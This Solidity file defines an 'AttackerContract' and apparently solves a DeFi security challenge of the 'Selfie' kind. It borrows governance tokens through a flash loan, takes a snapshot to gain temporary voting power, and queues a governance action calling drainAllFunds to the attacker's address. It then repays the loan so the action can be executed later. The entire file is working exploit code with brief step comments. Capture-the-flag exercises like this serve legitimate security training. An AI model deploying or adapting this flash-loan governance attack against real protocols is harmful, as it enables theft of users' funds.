// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IFlashLoan {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external;
}

interface IERC20 {
    function balanceOf(address account) external returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IERC20Snapshot {
    function snapshot() external returns (uint256);
}

contract AttackerContract {
    IFlashLoan private immutable flashLoanContract;
    IGovernance private immutable governanceContract;
    IERC20 private immutable governanceTokenContract;
    uint256 private proposalId;
    address immutable attacker;

    constructor(
        address flashLoanContractAddress,
        address governanceContractAddress,
        address governanceTokenContractAddress,
        address attackerAddress
    ) {
        flashLoanContract = IFlashLoan(flashLoanContractAddress);
        governanceContract = IGovernance(governanceContractAddress);
        governanceTokenContract = IERC20(governanceTokenContractAddress);
        attacker = attackerAddress;
    }

    function exploitFlashLoan() external {
        // EXPLAIN - Get flash loan
        flashLoanContract.flashLoan(governanceTokenContract.balanceOf(address(flashLoanContract)));
    }

    function receiveTokens(address token, uint256 borrowAmount) external {
        // EXPLAIN - Record snapshot
        IERC20Snapshot(address(governanceTokenContract)).snapshot();
        // EXPLAIN - Propose governance action to drain SelfiePool
        proposalId = governanceContract.queueAction(
            address(flashLoanContract), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0
        );
        // EXPLAIN - Return flash loan
        governanceTokenContract.transfer(address(flashLoanContract), governanceTokenContract.balanceOf(address(this)));
    }

    function executeGovernance() external {
        governanceContract.executeAction(proposalId);
    }
}
